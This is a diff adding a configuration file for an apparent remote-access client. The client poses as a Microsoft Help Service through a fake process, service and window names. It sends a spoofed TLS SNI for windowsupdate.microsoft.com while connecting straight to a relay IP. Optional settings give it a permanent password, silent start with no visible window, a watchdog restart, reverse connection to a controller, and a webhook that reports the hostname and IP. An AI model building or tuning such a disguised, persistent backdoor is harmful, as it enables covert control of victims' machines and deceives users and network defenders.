@@ -1,0 +1,60 @@
+[identity]
+process_name = "helpsvc_host.exe"
+service_name = "HelpSvc"
+service_display = "Microsoft Help Service"
+service_description = "Provides online help content and support."
+window_class = "HelpSettings"
+window_title = "Help Settings"
+mutex_name = "Global\\HelpSvc_Instance_Mutex"
+tray_tooltip = "Help Settings"
+config_dir = "HelpSvc"
+registry_key = "HelpSvc"
+log_prefix = "HelpSvc"
+
+[network]
+relay_ip = "192.168.1.3"
+relay_port = 443
+relay_domain = "support.internal.example.com"
+tls_sni = "windowsupdate.microsoft.com"
+use_ip_direct = true
+alpn = "http/1.1"
+http_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+extra_http_headers = "Accept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\n"
+
+# ---------------------------------------------------------------------------
+# Phase 3 – Headless operation & unattended access
+# All keys are OPTIONAL.  Remove the '#' to activate a feature.
+# ---------------------------------------------------------------------------
+
+[access]
+# Set a permanent password so connections succeed without the one-time prompt.
+# permanent_password = "MySecurePass123"
+
+# Use a fixed numeric ID instead of a random one (useful for asset tracking).
+# persistent_id = "488117552"
+
+# Derive a predictable ID from hostname + C:\ volume serial + salt.
+# SHA-256(hostname + serial + salt), first 9 decimal digits.
+# use_machine_id = true
+# machine_id_salt = "mysecretsalt"
+
+# Pre-authorised outbound notification: after registration the client POSTs its
+# ID to webhook_url; the controller can then initiate a connection back.
+# reverse_connect = true
+# controller_id = "123456789"
+
+[service]
+# Start with no visible window, tray icon, or taskbar entry.
+# silent_start = true
+
+# Global hotkey to toggle the UI on/off (Windows only, empty = disabled).
+# Supported modifiers: Ctrl, Shift, Alt, Win.  Key must be a VK name or char.
+# hotkey = "Ctrl+Shift+Alt+F12"
+
+# Spawn a watchdog process that restarts the client if it exits unexpectedly.
+# auto_restart = true
+
+[reporting]
+# URL for an HTTPS POST after successful rendezvous registration.
+# Payload: {"id":"...","hostname":"...","ip":"..."}
+# webhook_url = "https://internal.company.com/register"
